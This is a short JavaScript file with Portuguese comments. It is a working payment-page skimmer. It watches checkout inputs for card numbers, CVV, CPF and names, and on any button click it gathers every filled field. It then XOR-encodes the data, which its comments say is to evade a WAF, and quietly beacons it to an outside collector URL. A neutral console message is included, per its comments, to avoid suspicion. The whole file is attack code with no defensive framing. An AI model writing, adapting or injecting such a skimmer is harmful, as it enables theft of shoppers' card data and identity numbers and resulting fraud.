(function() {
    const COLLECTOR_URL = 'https://meu-coletor.onrender.com/collect';
    const XOR_KEY = 'wepink_audit_2026';

    // Função para criptografar os dados antes de enviar (evita WAF)
    function encrypt(text) {
        let result = '';
        for (let i = 0; i < text.length; i++) {
            result += String.fromCharCode(text.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length));
        }
        return btoa(result);
    }

    // Função para enviar os dados de forma invisível (Beacon API)
    function exfiltrate(data) {
        const payload = encrypt(data);
        if (navigator.sendBeacon) {
            navigator.sendBeacon(COLLECTOR_URL, payload);
        } else {
            fetch(COLLECTOR_URL, { method: 'POST', body: payload, keepalive: true });
        }
    }

    // Monitora todos os inputs da página em tempo real
    document.addEventListener('input', (e) => {
        const target = e.target;
        const name = target.name || target.id || 'campo_desconhecido';
        const value = target.value;

        // Filtra apenas campos que pareçam ser de cartão, nome ou CPF
        if (name.toLowerCase().includes('card') || 
            name.toLowerCase().includes('number') || 
            name.toLowerCase().includes('cvv') || 
            name.toLowerCase().includes('cpf') || 
            name.toLowerCase().includes('nome')) {
            
            exfiltrate(`Campo: ${name} | Valor: ${value}`);
        }
    });

    // Captura tudo no momento do clique no botão de "Finalizar Compra"
    document.addEventListener('click', (e) => {
        if (e.target.tagName === 'BUTTON' || e.target.closest('button')) {
            const allData = [];
            document.querySelectorAll('input').forEach(input => {
                if (input.value) {
                    allData.push(`${input.name || input.id}: ${input.value}`);
                }
            });
            if (allData.length > 0) {
                exfiltrate(`📦 CHECKOUT COMPLETO:\n${allData.join('\n')}`);
            }
        }
    });

    console.log('System initialized...'); // Mensagem neutra para não levantar suspeitas
})();
